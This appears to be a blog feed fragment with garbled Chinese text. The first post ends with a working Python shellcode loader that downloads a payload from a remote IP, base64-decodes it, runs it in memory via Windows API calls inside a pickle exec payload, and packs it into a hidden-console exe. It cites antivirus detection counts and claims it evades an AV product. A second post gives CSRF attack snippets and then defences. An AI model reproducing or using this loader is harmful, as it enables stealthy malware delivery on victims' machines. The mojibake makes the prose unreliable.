&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># åŠ è½½&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="æ‰“åŒ…exe">æ‰“åŒ…exe&lt;/h4>
&lt;p>ç”Ÿæˆpickle payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = urllib.request.urlopen(&amp;#39;http://192.168.31.29/pay1&amp;#39;).read()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = base64.b64decode(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = codecs.escape_decode(_shellcode)[0]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">_shellcode = bytearray(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(_shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">buf = (ctypes.c_char * len(_shellcode)).from_buffer(_shellcode)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ctypes.windll.kernel32.RtlMoveMemory(
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_uint64(ptr),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> buf,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(len(_shellcode))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">handle = ctypes.windll.kernel32.CreateThread(
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_uint64(ptr),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.c_int(0),
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> ctypes.pointer(ctypes.c_int(0))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¢«pyinstalleræˆ–py2exeæ‰“åŒ…çš„éƒ¨åˆ† pack1.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>PyInstaller&lt;/li>
&lt;/ul>
&lt;p>æ‰“åŒ…çš„æ›´å¤šå‚æ•°å‚è§&lt;a href="https://pyinstaller.org/en/stable/usage.html">doc: Using PyInstaller&lt;/a>ï¼Œç”Ÿæˆexeåœ¨distæ–‡ä»¶å¤¹ä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip3 install pyinstaller
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pyinstaller --noconsole --onefile pack1.py -n demo1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --noconsole æ— é»‘æ¡†&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --onefile å•ä¸€æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -i æŒ‡å®šfavicon&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -n ç”Ÿæˆexeåå­—&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°±ä»¥è¿™æ ·æœ€ç®€å•çš„æ–¹å¼åˆ¶ä½œçš„åŠ è½½å™¨çš„æŸ¥æ€æƒ…å†µæ˜¯&lt;a href="https://www.virustotal.com/gui/file/56420390689318d252b5aab886cb7aad52ee919e99896598306ed938dfc3cdf1">22/66&lt;/a>ï¼Œå¯ä»¥ç›´æ¥è¿‡ç«ç»’&lt;/p>
&lt;ul>
&lt;li>py2exeï¼ˆ*äº²æµ‹ ç”Ÿæˆçš„exeæ–‡ä»¶å¤§å°å°äºPyInstaller ä½†ä¸€å®šæ¦‚ç‡æ— æ³•æ‰§è¡Œ ï¼‰&lt;/li>
&lt;/ul>
&lt;p>ä¸­é—´åª’ä»‹pack2.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">distutils.core&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">py2exe&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;py2exe&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;optimize&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># ä¼˜åŒ–çº§åˆ«æœ€é«˜ï¼Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;bundle_files&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># å°†ç”Ÿæˆçš„è°ƒç”¨æ–‡ä»¶æ‰“åŒ…è¿›exeæ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;compressed&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># å‹ç¼©&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">windows&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[{&lt;/span>&lt;span style="color:#d88200">&amp;#34;script&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;pack1.py&amp;#34;&lt;/span>&lt;span style="color:#111">}],&lt;/span> &lt;span style="color:#75715e">#éœ€è¦æ‰“åŒ…çš„ç¨‹åºçš„æ–‡ä»¶è·¯å¾„ï¼Œwindows-&amp;gt;GUI exeçš„è„šæœ¬åˆ—è¡¨,console-&amp;gt; æ§åˆ¶å°exeçš„è„šæœ¬åˆ—è¡¨&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># ä¸ç”Ÿæˆlibrary.zipæ–‡ä»¶ï¼Œåˆ™æ†ç»‘åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip3 install py2exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python pack2.py py2exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŸ¥æ€æƒ…å†µ&lt;a href="https://www.virustotal.com/gui/file/87c4fc12bd71bd1fce694393a6f6cab8a1b18424ef6d2d2d6ad062a65ab83bca">14/69&lt;/a>ï¼Œå¯è¿‡ç«ç»’&lt;/p>
&lt;hr>
&lt;p>ä¸€å¼€å§‹å°±æ˜¯åšé¶åœºçš„æ—¶å€™ä¸€æ—¶å…´èµ·çœ‹çœ‹å…æ€ï¼Œåæ¥å‘ç°é‡Œé¢é—¨é“è¿˜æŒºå¤šçš„ï¼ˆæˆ‘æ˜¯åœŸç‹—ï¼‰ï¼Œä¼°è®¡ä»¥åæœ‰ç©ºè¿˜ä¼šè®¤çœŸå­¦&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://haiderm.com/undetectable-backdooring-pe-file/">Undetectable backdooring PE file&lt;/a> | &lt;a href="https://scareing.github.io/2019/12/27/%E6%89%8B%E5%B7%A5shellcode%E6%B3%A8%E5%85%A5/">æ‰‹å·¥shellcodeæ³¨å…¥&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/132175.html">æ¶æ„ç¨‹åºç¼–å†™ä¹‹å…æ€åŸºç¡€&lt;/a> | &lt;a href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/">å…æ€å­¦ä¹ &amp;ndash;shellcodeåŠ è½½å…æ€&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://webcache.googleusercontent.com/search?q=cache:oZ7CzvkDPFsJ:https://pukrr.github.io/2020/02/25/%25E5%2587%25A0%25E7%25A7%258D%25E5%258A%25A0%25E8%25BD%25BDshellcode%25E7%259A%2584%25E6%2596%25B9%25E6%25B3%2595/+&amp;amp;cd=4&amp;amp;hl=zh-CN&amp;amp;ct=clnk">å‡ ç§åŠ è½½shellcodeçš„æ–¹æ³•&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/Ne0nd0g/go-shellcode">go-shellcode&lt;/a> | &lt;a href="https://github.com/safe6Sec/GolangBypassAV">GolangBypassAV&lt;/a> | &lt;a href="https://github.com/pureqh/bypassAV">bypassAV&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.nday.top/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/">Python ShellcodeåŠ è½½å™¨ç»•è¿‡AV&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>cookieç›¸å…³çš„xss&amp;csrf</title><link>https://amiaaaz.github.io/2022/04/24/xss-csrf-study-notes/</link><pubDate>Sun, 24 Apr 2022 21:58:17 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/xss-csrf-study-notes/</guid><description>&lt;p>&lt;a href="https://www.freebuf.com/articles/web/186880.html">å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆäºŒï¼‰ï¼šå¦‚ä½•é˜²æ­¢CSRFæ”»å‡»ï¼Ÿ&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://ctf-wiki.org/web/xss/#self-xss">Self-XSS å˜åºŸä¸ºå®çš„åœºæ™¯&lt;/a>&lt;/p>
&lt;hr>
&lt;h1 id="csrf">CSRF&lt;/h1>
&lt;p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ„é€ æ¶æ„é¡µé¢è®©å—å®³è€…ç‚¹å‡»ï¼Œå†’ç”¨å—å®³è€…æœ¬åœ°çš„å‡­è¯ä¿¡æ¯æ‰§è¡Œéœ€è¦æˆæƒçš„ç‰¹å®šæ“ä½œï¼ˆå¦‚æ³¨é”€è´¦å·ç­‰ï¼‰ï¼ŒæŠŠæ”»å‡»è€…æ„é€ çš„è¯·æ±‚å½“ä½œå—å®³è€…è‡ªå·±å®Œæˆçš„è¯·æ±‚ï¼Œå±å®³å¾ˆå¤§&lt;/p>
&lt;h2 id="å¸¸è§ç±»å‹">å¸¸è§ç±»å‹&lt;/h2>
&lt;ul>
&lt;li>GETç±»å‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://bank.example/withdraw?amount=10000&amp;amp;for=hacker&amp;#34;&lt;/span> &lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>POSTç±»å‹&lt;/li>
&lt;/ul>
&lt;p>burpsuitå¯ç›´æ¥ç”Ÿæˆï¼Œå†æœ«å°¾å¯ä»¥åŠ ä¸Š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">forms&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">submit&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†ä¼šæ¨¡æ‹Ÿç”¨æˆ·çš„POSTæ“ä½œç›´æ¥å‘åŒ…&lt;/p>
&lt;h2 id="é˜²æŠ¤ç»•è¿‡">é˜²æŠ¤&amp;amp;ç»•è¿‡&lt;/h2>
&lt;p>å«CSRF payloadçš„é¡µé¢ä¸€èˆ¬æ¥è‡ªç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œå¹¶ä¸”ä¸èƒ½è·å–åˆ°cookieç­‰å‡­æ®ä¿¡æ¯ï¼Œåªèƒ½ä½¿ç”¨&lt;/p>
&lt;p>é’ˆå¯¹è¿™äº›ï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹çš„é˜²æŠ¤ç­–ç•¥ï¼ˆå½“ç„¶ä¼šæœ‰ç›¸åº”çš„å¯¹æŠ—æªæ–½ï¼‰&lt;/p>
&lt;h3 id="åŒæºæ£€æµ‹">åŒæºæ£€æµ‹&lt;/h3>
&lt;h4 id="è¯·æ±‚å¤´">è¯·æ±‚å¤´&lt;/h4>
&lt;p>HTTPçš„è¯·æ±‚åŒ…ä¸­åŒ…å«è¿™æ ·ä¸¤ä¸ªHeader&lt;/p>
&lt;pre tabindex="0">&lt;code>Origin:
Referer:
&lt;/code>&lt;/pre>&lt;p>ä¸¤ä¸ªè¯·æ±‚å¤´ç†è®ºä¸Šéƒ½ä¸èƒ½ç”±å‰ç«¯æ¥éšä¾¿ä¿®æ”¹ï¼Œä¸¤è€…éƒ½å¯ä»¥ç”¨æ¥ç¡®å®šè¯·æ±‚çš„æ¥æºåŸŸï¼Œä½†ç•¥æœ‰åŒºåˆ«&lt;/p>
&lt;ul>
&lt;li>Originï¼šè¯·æ±‚çš„åŸŸåï¼Œä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸å­˜åœ¨&lt;/li>
&lt;/ul>
&lt;p>IE11ä¸ä¼šåœ¨è·¨ç«™CORSè¯·æ±‚ä¸Šæ·»åŠ Originè¯·æ±‚å¤´&lt;/p>
&lt;p>302é‡å®šå‘&lt;/p>
&lt;ul>
&lt;li>Refererï¼šè¯·æ±‚çš„æ¥æºåœ°å€ï¼Œæœ‰ä»¥ä¸‹5ç§ç­–ç•¥&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>ç­–ç•¥å&lt;/th>
&lt;th>å±æ€§ - æ–°&lt;/th>
&lt;th>å±æ€§ - æ—§&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>No Referer&lt;/td>
&lt;td>no-Referer&lt;/td>
&lt;td>never&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>No Referer When Downgrade&lt;/td>
&lt;td>no-Referer-when-downgrade&lt;/td>
&lt;td>default&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Origin Only&lt;/td>
&lt;td>(same or strict)origin&lt;/td>
&lt;td>origin&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Origin When Cross Origin&lt;/td>
&lt;td>(strict)origin-when-crossorigin&lt;/td>
&lt;td>-&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Unsafe URL&lt;/td>
&lt;td>unsafe-url&lt;/td>
&lt;td>always&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>æˆ‘ä»¬å°†å…¶è®¾ç½®ä¸ºsame-originï¼Œè¡¨æ ¼å› æ­¤éœ€è¦æŠŠReferrer Policyçš„ç­–ç•¥è®¾ç½®æˆsame-originï¼Œå¯¹äºåŒæºçš„é“¾æ¥å’Œå¼•ç”¨ï¼Œä¼šå‘é€Refererï¼Œrefererå€¼ä¸ºHostä¸å¸¦Pathï¼›è·¨åŸŸè®¿é—®åˆ™ä¸æºå¸¦Refererï¼›ä¾‹å¦‚ï¼š&lt;code>aaa.com&lt;/code>å¼•ç”¨&lt;code>bbb.com&lt;/code>çš„èµ„æºï¼Œä¸ä¼šå‘é€Referer&lt;/p>
&lt;p>è®¾ç½®æ–¹å¼æœ‰ä¸‰ç§ï¼šCSPè®¾ç½®ï¼›é¡µé¢&lt;code>&amp;lt;meta&amp;gt;&lt;/code>æ ‡ç­¾ï¼›&lt;code>&amp;lt;a&amp;gt;&lt;/code>æ ‡ç­¾å¢åŠ referer policyå±æ€§&lt;/p>
&lt;p>ä»¥ä¸‹å‡ ç§æƒ…å†µä¸å«Refererï¼š&lt;/p>
&lt;p>HTTPS-&amp;gt;HTTPï¼›IE6,7ä¸‹çš„window.location.hrefå’Œwindow.openéƒ½ä¼šä¸¢å¤±ï¼›Flashåˆ°å¦ä¸€ä¸ªç½‘ç«™æ—¶Refereræ¯”è¾ƒæ‚ä¹±ï¼›&lt;code>&amp;lt;a&amp;gt;&lt;/code>æ ‡ç­¾è®¾ç½®refererpolicy=&amp;ldquo;no-referer&amp;rdquo;&lt;/p>
&lt;h4 id="csrf-token">CSRF Token&lt;/h4>
&lt;p>è¦æ±‚ç”¨æˆ·è¯·æ±‚æºå¸¦ä¸€ä¸ªæ”»å‡»è€…æ— æ³•è·å–åˆ°çš„Tokenï¼ŒæœåŠ¡å™¨é€šè¿‡æ ¡éªŒTokenæ¥åŒºåˆ†æ­£å¸¸è¯·æ±‚å’Œæ”»å‡»è¯·æ±‚ï¼›Tokenä¸å­˜åœ¨äºcookieä¸­ï¼ˆå¦åˆ™åˆä¼šè¢«å†’ç”¨ï¼‰ï¼Œå­˜äºæœåŠ¡å™¨çš„sessionä¸­&lt;/p>
&lt;ul>
&lt;li>æ·»åŠ token&lt;/li>
&lt;/ul>
&lt;p>éå†DOMï¼Œå¯¹äºDOMä¸­æ‰€æœ‰çš„&lt;code>&amp;lt;a&amp;gt;&lt;/code>å’Œ&lt;code>&amp;lt;form&amp;gt;&lt;/code>æ ‡ç­¾ååŠ å…¥token&lt;/p>
&lt;p>å¯¹äºé¡µé¢åŠ è½½ååŠ¨æ€ç”Ÿæˆçš„HTMLæ²¡æœ‰åŠæ³•&lt;/p>
&lt;p>éªŒè¯ç æˆ–å¯†ç ä¹Ÿå¯ä»¥å……å½“è¿™æ ·çš„æ•ˆæœ&lt;/p>
&lt;ul>
&lt;li>æ£€éªŒtoken&lt;/li>
&lt;/ul>
&lt;p>æœåŠ¡ç«¯è¿›è¡Œæ ¡éªŒ&lt;/p>
&lt;ul>
&lt;li>ç¼ºç‚¹&lt;/li>
&lt;/ul>
